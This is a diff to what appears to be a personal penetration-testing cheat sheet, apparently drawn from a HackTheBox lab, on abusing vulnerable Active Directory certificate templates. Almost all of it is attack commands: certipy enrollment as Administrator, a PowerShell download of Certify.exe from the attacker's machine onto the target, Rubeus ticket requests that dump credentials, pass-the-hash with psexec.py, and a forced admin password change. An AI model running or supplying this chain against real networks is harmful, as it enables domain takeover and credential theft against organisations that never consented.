@@ -6,19 +6,28 @@ First sync time to DC:
 ```shell
 sudo rdate -n $DCNAME
 ```
+OR
+```shell
+sudo ntpdate $DCNAME
+```
+and then restore
+```shell
+sudo ntpdate pool.ntp.org
+```
 
 SCAN AND EXPLOIT ESC 1 - 11 vulnerable certificate templates with certipy
 ---
 #certipy #vulnerable-template #ad #active-directory #ad-template 
 
+find vulnerable cert templates:
 ```shell
-certipy find -u $USER -p $PASS -dc-ip $TARGET_IP -vulnerable -stdout
+certipy find -u $USER -p $PASS -dc-ip $TARGET_IP -vulnerable -stdout -text
 ```
-
+request enrollment of user in template:
 ```shell
-certipy req -u $USER -p $PASS -ca $AD_CA_NAME -target $AD_DNS_NAME -template $TEMPLATE_FOUND_NAME -upn Administrator@$DOMAIN
+certipy req -u $USER -p $PASS -ca $AD_CA_NAME -target $AD_DNS_NAME -template $TEMPLATE_FOUND_NAME -upn Administrator@$DOMAIN -debug
 ```
-
+exploit to get admin hash:
 ```shell
 certipy auth -pfx administrator.pfx -dc-ip $TARGET_IP
 ```
@@ -43,20 +52,38 @@ Download on target:
 $URL="http://$LOCAL_IP/Certify.exe"
 $PATH="c:\users\$USER\Desktop\certify.exe"
 (New-Object System.Net.WebClient).DownloadFile($URL, $PATH)
+```
+and run the search
+```powershell
 ./certify.exe find /vulnerable
-./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
+./certify.exe request /ca:dc.$DOMAIN\$DOMAIN-DC-CA /template:UserAuthentication /altname:Administrator
 ```
 
-After you copy cert text to YOUR  machine, or if openssl is already installed:
+After that download the cert using evil-winrm:
+
+```powershell
+download cert.pem
+```
 
 ```shell
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-Download on target the cert.pfx and perform TGT request:
+Upload cert.pfx back to target and perform TGT request:
 
 ```powershell
+upload cert.pfx
 ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
+```
+
+or  get hash for evil-winrm etc.:
+
+```powershell
+./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
+```
+
+```sh
+psexec.py -hashes $HASH:$HASH $USER@$TARGET_IIP
 ```
 
 then
@@ -65,9 +92,18 @@ then
 ./Rubeus.exe changepw /ticket:doIG2DCCBtSg…<snip>…== /new:Password123!! /targetuser:$DOMAIN\Administrator
 ```
 
-OR https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py instead of rubeus.exe for asktgt function
+OR use:
 
-OR get hash with getnthash.py (untested)
+```link
+https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
+```
+instead of rubeus.exe for asktgt function
+
+OR get hash with
+
+```
+getnthash.py (untested)
+```
 
 then copy ticket.kirbi to LOCAL machine and :
 
@@ -96,8 +132,7 @@ $DOMAIN = {
 then sync time with DC domain controller server
 
 ```shell
-sudo apt install ntpdate
-sudo ntpdate dc.sequel.htb
+sudo ntpdate $DOMAIN_CONTROLLER
 ```
 
 Finally login to server using kerberos auth:
